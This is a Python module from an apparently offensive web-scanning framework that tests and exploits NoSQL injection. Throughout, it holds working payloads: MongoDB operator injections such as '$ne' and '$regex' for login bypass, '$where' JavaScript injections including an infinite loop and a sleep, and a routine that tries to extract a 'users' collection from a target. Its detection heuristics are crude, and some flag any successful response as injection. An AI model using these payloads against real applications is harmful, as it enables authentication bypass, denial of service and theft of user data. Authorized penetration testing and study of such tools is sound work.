#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - NoSQL Injection Module
NoSQL Injection detection and exploitation
"""

import re
import json
from config import Payloads, Colors


class NoSQLModule:
    """NoSQL Injection Testing Module"""
    
    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.name = "NoSQL Injection"
        
        # NoSQL indicators
        self.nosql_indicators = [
            '$ne',
            '$gt',
            '$lt',
            '$regex',
            '$exists',
            '$where',
            'mongodb',
            'bson',
            '_id',
            'ObjectId',
            'MongoError',
        ]
    
    def test(self, url: str, method: str, param: str, value: str):
        """Test for NoSQL Injection"""
        # Test operator injection
        self._test_operators(url, method, param, value)
        
        # Test JSON injection
        self._test_json_injection(url, method, param, value)
        
        # Test JavaScript injection
        self._test_js_injection(url, method, param, value)
    
    def test_url(self, url: str):
        """Test URL for NoSQL Injection"""
        pass
    
    def _test_operators(self, url: str, method: str, param: str, value: str):
        """Test NoSQL operators"""
        payloads = Payloads.NOSQL_PAYLOADS
        
        for payload in payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                response_text = response.text.lower()
                
                # Check for NoSQL indicators
                match_count = sum(1 for ind in self.nosql_indicators if ind.lower() in response_text)
                
                if match_count >= 2:
                    from core.engine import Finding
                    finding = Finding(
                        technique="NoSQL Injection (Operator-based)",
                        url=url,
                        severity='HIGH',
                        confidence=0.85,
                        param=param,
                        payload=payload,
                        evidence="NoSQL operator injection detected",
                    )
                    self.engine.add_finding(finding)
                    return
                
                # Check for authentication bypass
                if 'welcome' in response_text or 'dashboard' in response_text or 'logged in' in response_text:
                    if payload in ['{"$ne": null}', '{"$gt": ""}']:
                        from core.engine import Finding
                        finding = Finding(
                            technique="NoSQL Injection (Auth Bypass)",
                            url=url,
                            severity='CRITICAL',
                            confidence=0.9,
                            param=param,
                            payload=payload,
                            evidence="Authentication bypass possible with NoSQL operator",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'NoSQL operator test error: {e}')}")
    
    def _test_json_injection(self, url: str, method: str, param: str, value: str):
        """Test JSON-based NoSQL injection"""
        json_payloads = [
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"$where": "this.password.length > 0"}',
        ]
        
        for payload in json_payloads:
            try:
                headers = {'Content-Type': 'application/json'}
                response = self.requester.request(url, method, data=payload, headers=headers)
                
                if not response:
                    continue
                
                # Check for successful injection
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    if 'error' not in response_text and 'invalid' not in response_text:
                        from core.engine import Finding
                        finding = Finding(
                            technique="NoSQL Injection (JSON-based)",
                            url=url,
                            severity='HIGH',
                            confidence=0.8,
                            param=param,
                            payload=payload,
                            evidence="JSON payload accepted - potential NoSQL injection",
                        )
                        self.engine.add_finding(finding)
                        return
                        
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'NoSQL JSON test error: {e}')}")
    
    def _test_js_injection(self, url: str, method: str, param: str, value: str):
        """Test JavaScript injection in NoSQL"""
        js_payloads = [
            "'; return true; var dummy='",
            "'; return '1'=='1'; var dummy='",
            "'; while(true){}; var dummy='",
            "'; sleep(5000); var dummy='",
        ]
        
        for payload in js_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, method, data=data)
                
                if not response:
                    continue
                
                # Check for JavaScript execution
                if 'true' in response.text.lower() or response.status_code == 200:
                    from core.engine import Finding
                    finding = Finding(
                        technique="NoSQL Injection (JavaScript)",
                        url=url,
                        severity='CRITICAL',
                        confidence=0.75,
                        param=param,
                        payload=payload,
                        evidence="JavaScript code may have been executed",
                    )
                    self.engine.add_finding(finding)
                    return
                    
            except Exception as e:
                if self.engine.config.get('verbose'):
                    print(f"{Colors.error(f'NoSQL JS test error: {e}')}")
    
    def exploit_extract_data(self, url: str, param: str, collection: str = 'users') -> list:
        """Attempt to extract data via NoSQL injection"""
        extraction_payloads = [
            f'{{"$where": "return this.collection == \'{collection}\'"}}',
            f'{{"collection": "{collection}"}}',
        ]
        
        results = []
        for payload in extraction_payloads:
            try:
                data = {param: payload}
                response = self.requester.request(url, 'POST', data=data)
                
                if response:
                    results.append({
                        'payload': payload,
                        'response': response.text,
                    })
            except Exception as e:
                print(f"{Colors.error(f'NoSQL extraction error: {e}')}")
        
        return results
